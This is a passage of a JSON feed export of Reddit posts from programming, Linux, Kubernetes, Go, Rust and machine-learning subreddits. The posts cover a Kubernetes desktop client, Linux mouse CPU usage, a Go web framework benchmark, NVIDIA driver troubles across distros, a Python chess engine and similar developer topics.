</p> <p>The name is teleskopio. </p> <p>The motivation: This project intended mostly to learn and understand how kubernetes api server works. I need a tool to observe a cluster and perform changes in yaml objects, Ive tried implement tool to help me with those tasks. It must be usable in air-gaped environments and must not perform any external requests. It must support any cluster version hence no strict types must be hardcoded.</p> <p>I know there is a lot of clients like k9s or lens. Ive built my own and learn a lot while developed teleskopio. </p> <p>The source code is open and anyone can contribute.</p> <p>I’m not a rust or frontend developer so the code is mostly a mess. Please feel free to critic the code, report bugs or request features.</p> <p>Due to Apple restriction to install software there is no easy way to install it on mac os. </p> <p>For Linux users there is packages on release page.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/askoma\"> /u/askoma </a> <br/> <span><a href=\"https://github.com/roman-kiselenko/teleskopio\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1msp07s/yet_another_kubernetes_desktop_client/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Need guidance on setting up home lab for Devops","url":"https://www.reddit.com/r/kubernetes/comments/1msn2ks/need_guidance_on_setting_up_home_lab_for_devops/","date":1755425264,"author":"/u/Repulsive-Shine-1490","guid":230566,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hello folks,</p> <p>Need all your suggestions on setting up home lab for Devops tools. Actually I do not have a any knowledge on devops tools. From a month started a learning python scripting with scaler.</p> <p>Before they teach I want to set up my home lab but here I need to tell you that I do not have a personal laptop I want to set up in aws virtual machine there i want to install oracle cloud or vmware workstation. Please let me know is this possible or am I thinking in wrong way?</p> <p>Every suggestion will be helpful. By the way I have 6.5 years of experience in IT as a support engineer.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Repulsive-Shine-1490\"> /u/Repulsive-Shine-1490 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1msn2ks/need_guidance_on_setting_up_home_lab_for_devops/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1msn2ks/need_guidance_on_setting_up_home_lab_for_devops/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Eric Schmidt says he's read the Al 2027 scenario forecast about what the development of superintelligence might look like. He says the \"right outcome\" will be some form of deterrence and mutually assured destruction, adding that government should know where all the chips are.","url":"https://v.redd.it/s36ad09gyjjf1","date":1755424584,"author":"/u/katxwoods","guid":231487,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1msmvvp/eric_schmidt_says_hes_read_the_al_2027_scenario/"},{"title":"How much % CPU does your mouse use on Linux desktop?","url":"https://www.reddit.com/r/linux/comments/1msmuyv/how_much_cpu_does_your_mouse_use_on_linux_desktop/","date":1755424486,"author":"/u/trejj","guid":230609,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Here&#39;s something odd that we found out during a Linux LAN event this weekend. This is not a tech support question, but a peculiar behavior description that got people into quite a heated exchange during the event, and was seen as something unexpected.</p> <ol> <li>Close all programs so your Linux system is idle and no windows are open.</li> <li>Open a terminal and run <code>top</code>.</li> <li>Vigorously move your mouse in circles or back and forth over the desktop for several seconds, while observing output from <code>top</code>.</li> </ol> <p>Surprising result: on three tested systems (Linux Mint 22 Cinnamon, Debian 13, Fedora 42 KDE), CPU usage spikes up to 20%, 50% and even up to 100% on one system, just from moving the mouse.</p> <p>All these systems have desktop GPUs used for playing games - not integrated graphics.</p> <p>Someone said that they would have expected moving the mouse to not even register in <code>top</code>, i.e. some 0-1% CPU overhead, and that is what would happen on Windows and on macOS. That got me thinking that surely that couldn&#39;t be possible, since the CPU must do some work at least to process the mouse.</p> <p>Does Linux design dedicate a CPU core for processing the mouse?</p> <p>I thought it would be interesting to poll: how much CPU overhead does moving the mouse result in on your Linux desktop system? Is e.g. 20%-100% CPU usage from moving the mouse nominal/expected on Linux? Does some Linux distro/desktop environment get 0% for mouse?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/trejj\"> /u/trejj </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1msmuyv/how_much_cpu_does_your_mouse_use_on_linux_desktop/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1msmuyv/how_much_cpu_does_your_mouse_use_on_linux_desktop/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Intuition behind Power of 2 Choices Load balancing","url":"https://www.reddit.com/r/programming/comments/1msmq7v/intuition_behind_power_of_2_choices_load_balancing/","date":1755423969,"author":"/u/amandeepspdhr","guid":230607,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/amandeepspdhr\"> /u/amandeepspdhr </a> <br/> <span><a href=\"https://amandeepsp.github.io/blog/power-of-2/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1msmq7v/intuition_behind_power_of_2_choices_load_balancing/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] COLM Financial Assistance","url":"https://www.reddit.com/r/MachineLearning/comments/1msm3m4/d_colm_financial_assistance/","date":1755421525,"author":"/u/Master_Ocelot8179","guid":230541,"unread":true,"content":"<div><p>Has anybody gotten respone from COLM financial assistance? Its deadline was 31 July but I still have not recieved a yes or no response and they are not replying to my email.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/Master_Ocelot8179\"> /u/Master_Ocelot8179 </a>","contentLength":213,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"GDPR meant nothing: chat control ends privacy for the EU","url":"https://www.reddit.com/r/linux/comments/1msltp3/gdpr_meant_nothing_chat_control_ends_privacy_for/","date":1755420475,"author":"/u/smilelyzen","guid":230527,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/smilelyzen\"> /u/smilelyzen </a> <br/> <span><a href=\"https://www.reddit.com/r/Romania/comments/1msjxqp/gdpr_meant_nothing_chat_control_ends_privacy_for/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1msltp3/gdpr_meant_nothing_chat_control_ends_privacy_for/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"GoFlash: A Blazing-Fast, net/http-Native Go Web Framework That Outpaces Gin and Fiber v3","url":"https://www.reddit.com/r/golang/comments/1mslngv/goflash_a_blazingfast_nethttpnative_go_web/","date":1755419793,"author":"/u/Sharp_Animal","guid":230528,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>If you love Fiber’s ergonomics but need Gin’s reliability and full <strong>net/http</strong> compatibility, meet <strong>GoFlash</strong> — a tiny, modern framework that’s been built for speed <em>and</em> production-grade interop. In head-to-head benchmarks against <strong>Gin</strong> and <strong>Fiber v3</strong>, GoFlash comes out on top across a broad set of common API scenarios, while staying 100% compatible with the standard library and HTTP/2. (<a href=\"https://github.com/goflash/flash\" title=\"GitHub - goflash/flash: A fast, modular HTTP framework for Go — Fiber‑like ergonomics, Gin‑level reliability, 100% net/http\">GoFlash Framework</a>)</p> <h1>TL;DR</h1> <ul> <li><strong>Fastest overall</strong> in the published suite: GoFlash leads cumulative RPS and wins most individual workloads in the official benchmark repo (n=100,000,000 requests, 256 connections, keep-alive). Results include ping, params, context, JSON+validation, wildcard routing, groups (flat and deep), and middleware chains. (<a href=\"https://github.com/goflash/benchmarks/blob/main/results/summary_all_n100000000_c256_keep.csv\" title=\"benchmarks/results/summary_all_n100000000_c256_keep.csv at main · goflash/benchmarks · GitHub\">Benchmark Details</a>)</li> <li><strong>Ergonomics you already know</strong>, with a minimal <code>Ctx</code> and groupable middleware à la Fiber/Gin.</li> <li><strong>100% net/http</strong>: mount any <code>http.Handler</code>, play nicely with HTTP/2 today, and keep future paths (e.g., HTTP/3) open — no adapters required. Fiber’s fast because of <code>fasthttp</code>, but that also means you’re outside the stdlib’s interfaces.</li> </ul> <h1>Why GoFlash beats the usual suspects</h1> <p><strong>Performance without trade-offs.</strong> GoFlash piles on practical micro-optimizations (pooled JSON buffers, precomputed <code>Content-Length</code>, pooled gzip writers, optional write buffering, context pooling) while keeping a small, explicit API. You pay zero cost for features you don’t enable.</p> <p><strong>Interop first.</strong> Because the app itself is an <code>http.Handler</code>, you can mount legacy muxes, pprof, Prometheus, grpc-gateway, or anything else in the Go HTTP ecosystem. That makes incremental migration painless — something fasthttp-based stacks can’t claim as easily.</p> <p><strong>Batteries included.</strong> Logging (slog), recovery, CORS, <strong>OpenTelemetry</strong> tracing, sessions, gzip, request-ID, rate limiting, CSRF, timeout, validator (with i18n) — all available as opt-in middleware.</p> <h1>Benchmarks at a glance</h1> <p>The benchmark suite compares GoFlash, Gin, and Fiber v3 beta 5 across nine realistic scenarios:</p> <ol> <li><strong>Ping/Pong</strong></li> <li><strong>URL param</strong></li> <li><strong>Request context read/write</strong></li> <li><strong>JSON bind + validation</strong></li> <li><strong>Trailing wildcard route</strong></li> <li><strong>Route groups</strong></li> <li><strong>Deep (10-level) groups</strong></li> <li><strong>Single middleware</strong></li> <li><strong>Chain of 10 middlewares</strong></li> </ol> <p><strong>Methodology &amp; rig.</strong> Tests were run on a MacBook Pro (M3, 32GB) using <code>wrk</code> with 11 threads and 256 connections; each scenario implements functionally equivalent handlers with production/release settings. Full raw CSVs and plots (including <code>summary_all_n100000000_c256_keep.csv</code>) are published in the repo. As always, <em>your mileage may vary</em> — benchmark your own workload.</p> <blockquote> <p><strong>What the results show:</strong> In the cumulative chart and most scenario charts, GoFlash leads requests per second, with Fiber v3 beta 5 typically close behind and Gin trailing under high concurrency — while GoFlash preserves stdlib compatibility</p> </blockquote> <p>Graph with benchmark results<br/> <a href=\"https://github.com/goflash/flash/blob/main/public/images/all_benchmarks.png\">https://github.com/goflash/flash/blob/main/public/images/all_benchmarks.png</a></p> <h1>Quick start (it’s tiny)</h1> <pre><code>package main import ( &quot;log&quot; &quot;net/http&quot; &quot;github.com/goflash/flash&quot; mw &quot;github.com/goflash/flash/middleware&quot; ) func main() { app := flash.New() app.Use(mw.Recover(), mw.Logger()) app.GET(&quot;/hello/:name&quot;, func(c *flash.Ctx) error { return c.JSON(map[string]any{&quot;hello&quot;: c.Param(&quot;name&quot;)}) }) log.Fatal(http.ListenAndServe(&quot;:8080&quot;, app)) } </code></pre> <p>This gives you Fiber-like DX with Gin-like safety, and you can still mount any <code>http.Handler</code> (Prometheus, pprof, legacy muxes) directly.</p> <h1>When to pick GoFlash</h1> <ul> <li>You want <strong>top-tier throughput</strong> <em>and</em> first-class <strong>net/http</strong> interop.</li> <li>You’re migrating from Gin/Fiber and need <strong>grouped middleware</strong>, ergonomic helpers, and <strong>OpenTelemetry</strong> out of the box.</li> <li>You prefer a <strong>small, explicit API</strong> over heavy abstractions.</li> </ul> <h1>When to double-check</h1> <ul> <li>If you rely on a specific Fiber/Gin plugin, check parity or mount it via <code>http.Handler</code>.</li> <li>As with any benchmark, confirm on your hardware and traffic patterns; the repo scripts (<code>bin/build</code>, <code>bin/start</code>, <code>bin/run</code>) make reproducing results straightforward.</li> </ul> <h1>Final thoughts</h1> <p>With GoFlash you don’t have to choose between speed and compatibility. The numbers show it can <strong>beat Gin and Fiber v3 beta 5 in most scenarios</strong>, while letting you keep the entire stdlib ecosystem at your fingertips. If you’re starting a new Go service — or modernizing an old one — GoFlash is absolutely worth a benchmark run in your CI tonight.</p> <p><em>Fiber is built on</em> <code>fasthttp</code> <em>(not net/http), which is one reason it often performs well in synthetic tests — but it also affects interoperability; GoFlash stays within the standard library path.</em></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Sharp_Animal\"> /u/Sharp_Animal </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1mslngv/goflash_a_blazingfast_nethttpnative_go_web/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1mslngv/goflash_a_blazingfast_nethttpnative_go_web/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Technologies to use for a web app","url":"https://www.reddit.com/r/golang/comments/1mslf1d/technologies_to_use_for_a_web_app/","date":1755418884,"author":"/u/manuelarte","guid":230529,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>As of today, what libraries would you use to build a web app in Go.</p> <p>At my current company we are using</p> <p>- <a href=\"https://gin-gonic.com\">Gin</a><br/> - <a href=\"https://gorm.io/index.html\">Gorm</a><br/> - <a href=\"https://github.com/golang-migrate/migrate\">Migrate</a><br/> - <a href=\"https://github.com/uber-go/mock\">Uber Mocks</a><br/> - <a href=\"https://github.com/golangci/golangci-lint/\">Golangci-lint</a></p> <p>But in my case, if I could chose/refactor this I would go for something like:</p> <p>- <a href=\"https://github.com/go-chi/chi\">Chi</a><br/> - <a href=\"https://github.com/oapi-codegen/oapi-codegen\">Openapi-codegen</a><br/> - <a href=\"https://sqlc.dev/\">Sqlc</a><br/> - <a href=\"https://github.com/golang-migrate/migrate\">Migrate</a><br/> - <a href=\"https://github.com/uber-go/mock\">Uber Mocks</a><br/> - <a href=\"https://github.com/golangci/golangci-lint/\">Golangci-lint</a><br/> - <a href=\"https://opentelemetry.io/docs/languages/go/\">OpenTelemetry</a></p> <p>Any other recommendations or comments?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/manuelarte\"> /u/manuelarte </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1mslf1d/technologies_to_use_for_a_web_app/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1mslf1d/technologies_to_use_for_a_web_app/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"We’re building more homes for AIs than humans","url":"https://www.reddit.com/r/artificial/comments/1msldmx/were_building_more_homes_for_ais_than_humans/","date":1755418742,"author":"/u/MetaKnowing","guid":230572,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"kubernetes - splunk logs data analysis using ML","url":"https://www.reddit.com/r/kubernetes/comments/1msknaz/kubernetes_splunk_logs_data_analysis_using_ml/","date":1755416004,"author":"/u/containers999","guid":230524,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Greetings,</p> <p>What do you think of integrating kubernetes logs (infra &amp; audit) to python base ML libraries like (scikit-learn) for majorly focus on :</p> <p>- Real-time Log Analysis: Continuously monitors Kubernetes cluster logs</p> <p>- ML-based Incident Prediction: Uses machine learning to predict potential issues</p> <p>- Automated Alerting: Integrates with ITIL tool for instant notifications</p> <p>Real-world Application</p> <p>This should be particularly effective for:</p> <ul> <li><p>Proactive incident detection before they become critical</p></li> <li><p>Pattern recognition across large volumes of kubernetes logs</p></li> <li><p>Automated triage of incidents by severity</p></li> <li><p>Root cause analysis through anomaly detection</p></li> <li><p>Operational efficiency by reducing manual log analysis</p></li> </ul> <p>Do you think this is feasible or a sane approach ... or its a overkill or there are better alternatives available ??? </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/containers999\"> /u/containers999 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1msknaz/kubernetes_splunk_logs_data_analysis_using_ml/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1msknaz/kubernetes_splunk_logs_data_analysis_using_ml/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"So this is Zuck's vision for AI","url":"https://www.reddit.com/r/artificial/comments/1mski42/so_this_is_zucks_vision_for_ai/","date":1755415483,"author":"/u/MetaKnowing","guid":230573,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Learn Linux before Kubernetes","url":"https://www.reddit.com/r/programming/comments/1msjtp6/learn_linux_before_kubernetes/","date":1755413022,"author":"/u/Lazy-Transition8236","guid":230525,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Lazy-Transition8236\"> /u/Lazy-Transition8236 </a> <br/> <span><a href=\"https://medium.com/@anishnarayan/learn-linux-before-kubernetes-60d27f0bcc09?sk=93a405453499c17131642d9b87cb535a\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1msjtp6/learn_linux_before_kubernetes/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Why are some distros better than others at handling nvidia drivers?","url":"https://www.reddit.com/r/linux/comments/1msiwhb/why_are_some_distros_better_than_others_at/","date":1755409786,"author":"/u/justamathguy","guid":230542,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I hope being brave enough to post this here, instead of <a href=\"/r/linux4noobs\">r/linux4noobs</a> was not the wrong decision. Be kind linux gigachads, I have been using linux personally and for work for a few years now, so felt confident to post here.</p> <p>I am kind of a distro hopper (I see/reminisce about a different distro than the one I am currently on, I will bkp my data and do a fresh install), but trying my best to stop doing this.</p> <p>So, over the course of the last 10 days, I have tried 3-4 different distros on the same set of hardware (an HP Omen Laptop with AMD CPU and Nvidia GPU (1660Ti) ). And I had quite the different set of experiences when it came to getting my dGPU working across them.</p> <p>First up was Cachy OS (back home, using it right now and mostly stick to this), pretty smooth sailing. No issues with the installer, it loaded up without any special flags/changes to GRUB. Installed the drivers on its own. I could login to a desktop and use applications on the GPU directly after install.</p> <p>Next was Linux Mint, though it didn&#39;t install nvidia proprietary or the new nvidia-open ones (not noveau)...still worked, installer used my integrated GPU. And installing post install on linux mint has always been nice and easy for me. just go to their driver manager and it tells you which one is reccomended amongst the various proprietary drivers and you just install that. After install, everything works as expected.</p> <p>Then MX Linux, given their focus on accessibility/ease-of-use with their MxTools, it was pretty easy there too.......to cut the story short...lets fast forward a bit</p> <p>Then I wanted to give openSUSE another shot after I had heard zypper got parallel downloads. And boy was that a mistake.....when I launch the installer without modifying nomodeset in GRUB, it will not load the installer for me (I checked all ttys with ctrl+alt+f2-f7)...and if do launch installer by setting nomodeset it starts up and installls.......BUT!!!! directly after installing the OS I get 1280x768 something resolution which is wrong! (my display is 1080p). Also btw, everytime after installing openSUSE, zypper repo list was broken for me, it was referencing a repo from my boot USB or something so I had to remove it. Then I followed the automated install steps on <a href=\"https://en.opensuse.org/SDB:NVIDIA_drivers\">https://en.opensuse.org/SDB:NVIDIA_drivers</a> --&gt; add the NVIDIA repo, refresh zypper, then the automated install steps (which btw it says, tested on TUMBLEWEED !!!!!) and lo and behold zypper does install something. Since I had secure boot disabled both before install and (set it to disabled in the OS installer) I didn&#39;t have to go through the MOK process (it never appeared after reboot)....and it still didn&#39;t fucking work!!!</p> <p>So the main thing I wanted to discuss is why? why is it like this? that some arch-based distro can support a GPU driver out of the box, an LTS debian distro can support the computer out of the box and then post install you can install proprietary drivers pretty straightforward way but these rpm based distros always make it so complicated ! (unless you go for ublue or some other containerized version)</p> <p>The thing with opensuse is, there wasn&#39;t even noveau bundled in and even though it was using my integrated GPU it was the completely wrong res when other distros like mint allow me to run at the right res even with my integrated gpu. And I completely opted out of the SE Linux/App-armor thing during install.....</p> <p>so tell me, what kind of sane person who has nvidia GPUs would use openSUSE? since it seems to be so unreliable? (ik RHEL is even worse, have to use it at work) why would someone with say a server with one or more nvidia GPUs use something like openSUSE or RHEL or any rpm based distro (Fedora has also been a bit all over the place with regards to the drivers in the past for me) ?</p> <p>and why can&#39;t they just do it like debian based distros seem to do it? or arch-based distros do it? or bundle something either noveau or the new nvidia-open ones in their initial install ?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/justamathguy\"> /u/justamathguy </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1msiwhb/why_are_some_distros_better_than_others_at/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1msiwhb/why_are_some_distros_better_than_others_at/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"moonfish: a ~2000 Elo python chess engine","url":"https://www.reddit.com/r/programming/comments/1msic8l/moonfish_a_2000_elo_python_chess_engine/","date":1755407889,"author":"/u/luccabz","guid":230526,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Moonfish is a chess engine I developed in Python a few years ago to understand how engines work under the hood. The code favors simplicity and readability over performance optimization.</p> <p>The engine implements:</p> <ul> <li>Negamax</li> <li>Layer-based Parallelization: Distributes work at specific search depths (L1P, L2P algorithms)</li> <li>Lazy SMP</li> <li>Move Ordering: MVV-LVA (Most Valuable Victim - Least Valuable Attacker)</li> <li>Null Move Pruning</li> <li>PeSTO Evaluation Function with Tapered Evaluation</li> <li>UCI protocol</li> <li>Integrates with lichess bot platform</li> <li>Web API</li> <li>Uses Cerebellum as opening book</li> <li>Endgame tablebases support</li> <li><a href=\"https://pypi.org/project/moonfish/\">Distributed via PyPI</a>, you can access the engine from your custom python code, <a href=\"https://github.com/luccabb/moonfish/tree/master?tab=readme-ov-file#installation-and-usage\">check the README</a></li> <li>Bratko-Kopec test suite</li> <li>Custom test suite to ensure basic functionality. Not sure how much ELO it tests for, but if these tests are passing it your custom engine search implementation is likely not super off. If it does fail then your search algorithm _likely_ has a problem </li> <li>You can control how the engine behaves via CLI arguments, `moonfish --help` to check all options.</li> </ul> <p>On Performance:</p> <ul> <li>~2000 Elo when tested against lichess stockfish bots. <ul> <li>it beats <a href=\"https://lichess.org/forum/general-chess-discussion/what-are-the-elo-ratings-for-stockfish-levels-4-5-6-7-and-8#8\">stockfish lvl 5 ~2000 Elo</a>.</li> <li>mostly loses to <a href=\"https://lichess.org/forum/general-chess-discussion/what-are-the-elo-ratings-for-stockfish-levels-4-5-6-7-and-8#8\">stockfish lvl 6 ~2300 Elo</a>.</li> </ul></li> <li>When testing online on lichess against other engines it performs at ~1700 Elo</li> <li>The above is when running on a Macbook M1 Pro, this will vary based on hardware and parameters passed to the engine.</li> <li>No time control implemented—deeper searches take proportionally longer</li> </ul> <p>For a list of resources and inspirations that helped shape Moonfish, check out the <a href=\"https://github.com/luccabb/moonfish?tab=readme-ov-file#references\">references</a> in the repository.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/luccabz\"> /u/luccabz </a> <br/> <span><a href=\"https://github.com/luccabb/moonfish\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1msic8l/moonfish_a_2000_elo_python_chess_engine/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Where to define return structs for the ‘accept interfaces, return structs’ idiom","url":"https://www.reddit.com/r/golang/comments/1msfsx9/where_to_define_return_structs_for_the_accept/","date":1755399649,"author":"/u/Zibi04","guid":230491,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I&#39;ve been trying to implement the &quot;Accept Interfaces, return Structs&quot; idiom but am having trouble applying it across packages.</p> <p>For example, some package (the consumer) defines an interface:</p> <pre><code>package foo type Something Interface { SomeFunc(id string) Result } </code></pre> <p>In this case, <code>Result</code> is a struct. Where should the definition of <code>Result</code> live?</p> <ol> <li>In the consumer package, which means the implementation must use <code>foo.Result</code></li> <li>in the package that implements the interface, which means the Interface above must return <code>otherPackage.Result</code></li> <li>Some separate shared package that both the consumer(s) and implementations point to</li> </ol> <p>My thoughts are:</p> <ul> <li>1 is most in-line with the consumer defining the contract but it feels a bit like a circular dependency</li> <li>2 causes the contract to be split across both packages, which isn&#39;t ideal</li> <li>3 is similar to #2 but also creates a package for no reason</li> </ul> <p>Let me know what the best method is or if there&#39;s a better option. I&#39;m honestly unsure.</p> <p>Thank you :)</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Zibi04\"> /u/Zibi04 </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1msfsx9/where_to_define_return_structs_for_the_accept/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1msfsx9/where_to_define_return_structs_for_the_accept/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Learning Kubernetes as of now","url":"https://www.reddit.com/r/kubernetes/comments/1mse21r/learning_kubernetes_as_of_now/","date":1755394395,"author":"/u/quilograma","guid":230471,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hello Guys,</p> <p>I&#39;m a Machine Learning Engineer who really would like to learn Kubernetes. For the sake of context, I&#39;m already comfortable with Docker and major Cloud providers. Which resources have helped you master k8s both in theory and practice? From begginer to grounded user. Could you please share?</p> <p>Big thanks!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/quilograma\"> /u/quilograma </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mse21r/learning_kubernetes_as_of_now/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mse21r/learning_kubernetes_as_of_now/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Rewrite of Numaflow: A Stream Processing Platform Written in Rust","url":"https://www.reddit.com/r/rust/comments/1msdzfr/rewrite_of_numaflow_a_stream_processing_platform/","date":1755394181,"author":"/u/vm_vm_vm","guid":230551,"unread":true,"content":"<p>A quick intro, Numaflow is an open-source, K8s-native platform for stream processing, and with the latest release it’s now running on a Rust-based data plane for faster, more reliable stream processing and here is our journey in Rust.</p><p> Rust at the core → no GC pauses, memory safety etc</p><p>Message-level streaming → smoother tail latency for uneven workloads (great for AI and data workloads)</p><p>Proven performance → ~40% higher throughput, ~30% less CPU, lower memory use</p><p>First mature Rust option → not just bindings, the whole runtime is Rust</p>","contentLength":544,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I'm about to take me first rust interview tomorrow.. I'am much worried about the coding interview part...any tips ?","url":"https://www.reddit.com/r/rust/comments/1msdtxt/im_about_to_take_me_first_rust_interview_tomorrow/","date":1755393716,"author":"/u/Just_Distance317","guid":230568,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What are your stakes on the reliability of these roles?","url":"https://www.reddit.com/r/kubernetes/comments/1msca3i/what_are_your_stakes_on_the_reliability_of_these/","date":1755389252,"author":"/u/ExplorerIll3697","guid":230463,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/kubernetes/comments/1msca3i/what_are_your_stakes_on_the_reliability_of_these/\"> <img src=\"https://preview.redd.it/fe58pxfg1hjf1.jpeg?width=640&amp;crop=smart&amp;auto=webp&amp;s=f43f561286cc0888d3b8b5f8d4ad4eaf0a382d82\" alt=\"What are your stakes on the reliability of these roles?\" title=\"What are your stakes on the reliability of these roles?\" /> </a> </td><td> <!-- SC_OFF --><div class=\"md\"><p>Which of these roles do you think will still be top notch in 20years and how reliable is it?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/ExplorerIll3697\"> /u/ExplorerIll3697 </a> <br/> <span><a href=\"https://i.redd.it/fe58pxfg1hjf1.jpeg\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1msca3i/what_are_your_stakes_on_the_reliability_of_these/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"DOSember Game Jam — MS-DOS coding event ending with celebration of the OS in December","url":"https://www.reddit.com/r/programming/comments/1ms9wab/dosember_game_jam_msdos_coding_event_ending_with/","date":1755383325,"author":"/u/r_retrohacking_mod2","guid":230686,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/r_retrohacking_mod2\"> /u/r_retrohacking_mod2 </a> <br/> <span><a href=\"https://itch.io/jam/dosember-game-jam\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1ms9wab/dosember_game_jam_msdos_coding_event_ending_with/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[Media] Releasing Mach - a web fuzzing tool designed for massive workloads","url":"https://www.reddit.com/r/rust/comments/1ms9u3t/media_releasing_mach_a_web_fuzzing_tool_designed/","date":1755383184,"author":"/u/magixer","guid":230472,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/magixer\"> /u/magixer </a>","contentLength":30,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] Dino v3: Self-supervised learning for vision at unprecedented scale","url":"https://ai.meta.com/blog/dinov3-self-supervised-vision-model/","date":1755382065,"author":"/u/say_wot_again","guid":230448,"unread":true,"content":"<div>Get Facebook on Your Phone</div><div>Stay connected anytime, anywhere.</div>","contentLength":59,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/MachineLearning/comments/1ms9d2u/r_dino_v3_selfsupervised_learning_for_vision_at/"},{"title":"Automatic translation of applications using AI","url":"https://www.reddit.com/r/golang/comments/1ms9317/automatic_translation_of_applications_using_ai/","date":1755381432,"author":"/u/StephenAfamO","guid":230440,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/golang/comments/1ms9317/automatic_translation_of_applications_using_ai/\"> <img 